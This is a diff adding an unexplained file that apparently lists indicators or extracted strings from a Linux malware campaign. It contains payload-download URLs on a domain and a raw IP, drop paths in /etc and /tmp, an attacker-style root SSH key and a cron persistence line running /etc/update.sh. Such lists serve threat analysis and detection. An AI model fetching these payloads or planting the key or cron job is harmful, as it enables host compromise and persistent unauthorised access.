@@ -1,0 +1,35 @@
+
+	de.gsearch.com.de AkA E5DB0E07C3D7BE80V520
+	##########################################
+
+
+
+http://185.181.10.234/E5DB0E07C3D7BE80V520/init.sh
+
+https://de.gsearch.com.de/api/sysupdate"
+http://185.181.10.234/E5DB0E07C3D7BE80V520/sysupdate"
+https://de.gsearch.com.de/api/update.sh"
+http://185.181.10.234/E5DB0E07C3D7BE80V520/update.sh"
+https://de.gsearch.com.de/api/config.json"
+http://185.181.10.234/E5DB0E07C3D7BE80V520/config.json"
+https://de.gsearch.com.de/api/networkservice"
+http://185.181.10.234/E5DB0E07C3D7BE80V520/networkservice"
+https://de.gsearch.com.de/api/sysguard"
+http://185.181.10.234/E5DB0E07C3D7BE80V520/sysguard"
+
+/etc/sysupdates
+/etc/sysupdate
+/etc/networkservice
+/etc/update.sh
+/etc/config.json
+/etc/sysguard
+/etc/sysupdates
+/tmp/sysupdate
+/tmp/networkservice
+/tmp/sysguard
+/tmp/update.sh
+/tmp/config.json
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17
+
+echo "*/30 * * * * sh /etc/update.sh >/dev/null
